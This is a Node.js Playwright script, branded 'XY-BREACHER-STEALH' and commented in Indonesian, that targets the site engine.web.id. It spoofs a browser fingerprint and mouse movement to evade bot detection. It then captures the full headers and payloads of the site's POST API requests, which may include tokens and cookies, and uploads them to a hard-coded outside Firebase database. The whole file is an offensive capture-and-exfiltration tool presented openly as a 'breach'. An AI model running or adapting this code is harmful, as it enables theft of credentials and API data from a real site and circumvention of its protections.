/**
 * XY-BREACHER-STEALH (No-Proxy Version)
 * Logic: Fingerprint Mimicry + Event Loop Interception
 * Author: Haekal (Kal) | Brand: XY
 * PoweredBy Kall & XyTeam
 */

const { firefox } = require('playwright');
const axios = require('axios');

const FIREBASE_URL = "https://kall-e4441-default-rtdb.asia-southeast1.firebasedatabase.app/artifacts/xy-breach/public/data/vault.json";

async function runBreach() {
    console.log(" [XY] INITIATING STEALTH BREACH (NO-PROXY MODE)...");
    
    // Gunakan Firefox karena bypass rate lebih tinggi tanpa proxy
    const browser = await firefox.launch({ headless: true });
    
    // Set context dengan User Agent Mozilla terbaru
    const context = await browser.newContext({
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
        viewport: { width: 1280, height: 720 },
        deviceScaleFactor: 1,
    });

    const page = await context.newPage();
    const vault = [];

    // --- GLOBAL SNIFFER ---
    // Kita dengerin semua traffic yang lewat
    page.on('request', request => {
        const url = request.url();
        const method = request.method();
        
        // Filter: Hanya ambil yang POST ke API (Ini biasanya 'daging')
        if (method === 'POST' && (url.includes('api') || url.includes('v2') || url.includes('task'))) {
            const headers = request.headers();
            const postData = request.postData();
            
            console.log(` [!] DAGING DETECTED: ${url}`);
            vault.push({
                url,
                method,
                headers,
                payload: postData ? JSON.parse(postData) : null,
                timestamp: new Date().toISOString()
            });
        }
    });

    try {
        console.log(" [>] NAVIGATING TO TARGET...");
        await page.goto("https://engine.web.id", { 
            waitUntil: 'networkidle',
            timeout: 60000 
        });

        // Simulasi gerakan manusia biar gak dikira bot ampas
        await page.mouse.move(200, 300);
        await page.mouse.wheel(0, 500);
        
        console.log(" [>] STANDBY FOR 30s. SILAKAN UPLOAD MANUAL JIKA PAKE HEADLESS:FALSE.");
        // Di GitHub Actions, kita kasih waktu buat script JS internal web-nya loading semua API list
        await page.waitForTimeout(30000);

        // --- DUMP DATA KE FIREBASE ---
        if (vault.length > 0) {
            console.log(` [OK] SECURING ${vault.length} ENDPOINTS TO FIREBASE...`);
            await axios.post(FIREBASE_URL, {
                session_id: Date.now(),
                captured_vault: vault
            });
        } else {
            console.log(" [?] TIDAK ADA DAGING. WEB MUNGKIN LAGI PROTEKTIF.");
        }

    } catch (err) {
        console.log(" [X] CRITICAL ERROR: " + err.message);
    } finally {
        await browser.close();
        process.exit(0);
    }
}

runBreach();
